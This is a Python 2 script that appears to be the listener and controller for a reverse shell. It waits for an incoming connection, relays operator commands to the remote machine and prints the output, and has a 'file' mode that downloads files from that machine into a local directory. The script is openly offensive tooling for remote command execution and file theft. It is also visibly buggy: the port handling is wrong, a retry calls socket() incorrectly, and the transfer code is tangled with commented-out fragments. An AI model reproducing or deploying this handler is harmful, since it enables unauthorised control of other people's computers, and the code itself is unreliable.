import os,sys,socket
MAX_BYTES = 999999



def socketCreate():
    try:
        global host
        global port 
        global s
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = '0.0.0.0' 
        port = input("enter the port for listening!!!")
        if port == '':
            socketCreate()
            port = int(port)
            
    except socket.error as msg:
        print('Exception happened')
        print('socket creation error: ' +str(msg[0]))

def socketBind():
    try:
        print('binding to socket at port: %s' %(port))
        s.bind((host,port))
        s.listen(1)

    except socket.error as msg:                
        print('socket binding error: ' +str(msg[0]))
        print('retrying ...')
        socket()


    #########***************************###########
def socketAccept():
    global conn
    global addr 
    global hostname
    global command
    global result
    global cmd
    try:
        conn, addr = s.accept()
        print('Sesseion opened at %s:%s' %(addr[0],addr[1]))
                
        hostname = conn.recv(4096)
        menu()
    except socket.error as msg:
        print('socket acception being thrown up')

def menu():
    while 1:
        #cmd = raw_input(str(addr[0]+'@' + str(hostname) +'>'))
        cmd = raw_input('Enter a Command!!')
        if 'file' in cmd:
            print 'executing file transfer function !!'
            command = conn.send(cmd)
            result = conn.recv(1024)
            print('Initiating Connection')

            import socket 
            port =  777
            s = socket.socket()
            #host = socket.gethostname()
            host = '127.0.0.1'
            #s.bind((host,port))
            #s.listen(5)
            s.connect((host,port))
    
            print "server listening from host %s and  port: %s :" %(host,port)   
    


            while True:
                    #conn, addr = s.accept()
                    #print "got connection from ", addr
                    ####### make this client ##########
                    s.recv(1024)
                    data = raw_input('pease enter the filename')
                    print data
                    s.send(data)
                    data = data.split('/', -1)[-1]
                    with open('/root/dev/tmp/'+data,'wb') as f:
                            print 'file opened'
                            while True:
                                print 'receiving data'
                                data = s.recv(1024)
                                print('data=%s', (data))
                                if '/r/n' in data:
                                        return
                                f.write(data)
                            f.close()
                    
                            #choice = raw_input('type: file to download another file or quit to continue command mode of reverse shell')
                            #if choice == 'file':
                             #   download()
                            #elif choice == 'quit':
                             #   #s.send('quit')
                              #  main()
                            menu()



        ## send command and receive the output ##
        elif cmd != 'file':
            command = conn.send(cmd)
            result = conn.recv(4096)
            print result

        
def upload():
    print 'this is upload func'



                    #print 'file download complete closing'
    ######################################
            #data = conn.recv(1024)
            #print('server received ', repr(data))
            ##filename = mytext.tmp
            #filename = data
            #f = open(filename,'rb')
            #l = f.read(1024)
            #while (l):                            
                    #conn.send(l)
                    #print('sent ',repr(l))
                    #l = f.read(1024)
                    #f.close()
                    #print 'done sending data'
                    #conn.send('Done sending data')
    print 'file download complete'
    print 'closing'
        
def main():

        socketCreate()
        socketBind()
        socketAccept()
        
if __name__ == '__main__':
    main()


